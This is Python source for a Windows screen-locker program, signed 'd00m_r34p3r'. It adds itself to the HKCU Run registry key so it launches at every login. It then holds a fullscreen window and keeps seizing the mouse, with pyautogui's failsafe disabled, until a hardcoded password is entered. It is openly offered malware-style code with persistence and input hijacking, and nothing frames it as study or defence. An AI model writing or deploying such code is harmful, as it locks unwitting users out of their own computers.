import pyautogui
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep
import winreg as reg
import os   

def AddToRegistry():
    # name of the python file with extension
    s_name = "notlocker.exe"

    # joins the file name to end of path address
    pth = os.path.dirname(os.path.realpath(__file__))
    address = os.path.join(pth, s_name)

    # key we want to change is HKEY_CURRENT_USER
    # key value is Software\Microsoft\Windows\CurrentVersion\Run
    key = reg.HKEY_CURRENT_USER
    key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"

    # check if the value already exists in the registry
    try:
        open = reg.OpenKey(key, key_value, 0, reg.KEY_READ)
        value, _ = reg.QueryValueEx(open, "notlocker")
        if value == address:
            reg.CloseKey(open)
            return
        reg.CloseKey(open)
    except WindowsError:
        pass

    # open the key to make changes to
    open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)

    # modify the opened key
    reg.SetValueEx(open, "notlocker", 0, reg.REG_SZ, address)

    # now close the opened key
    reg.CloseKey(open)
    
def callback(event):
    global k, entry
    if entry.get() == 'exit':
        k = True

def on_closing():
    click(width/2, height/2)
    moveTo(width/2, height/2)
    root.attributes('-fullscreen', True)
    root.protocol('WM_DELETE_WINDOW', on_closing)
    root.update()
    root.bind('<Control-KeyPress-c>', callback)

if __name__=='__main__':
    
    AddToRegistry()
    
    root = Tk()
    pyautogui.FAILSAFE = False

    width = root.winfo_screenwidth()
    height = root.winfo_screenheight()

    root.title('From d00m_r34p3r with love <3')
    root.attributes('-fullscreen', True)

    entry = Entry(root, font=1)
    entry.place(width=150, height=50, x=width/2-75, y=height/2-25)

    label0 = Label(root, text='Locker by d00m_r34p3r (J°0°)J', font=1)
    label0.grid(row=0, column=0)

    label1 = Label(root, text='Enter password and press Ctrl + C', font='Arial 20')
    label1.place(x=width/2-75-130, y=height/2-25-100)

    root.update()
    sleep(0.2)

    click(width/2, height/2)
    k=False

    while not k: 
        on_closing()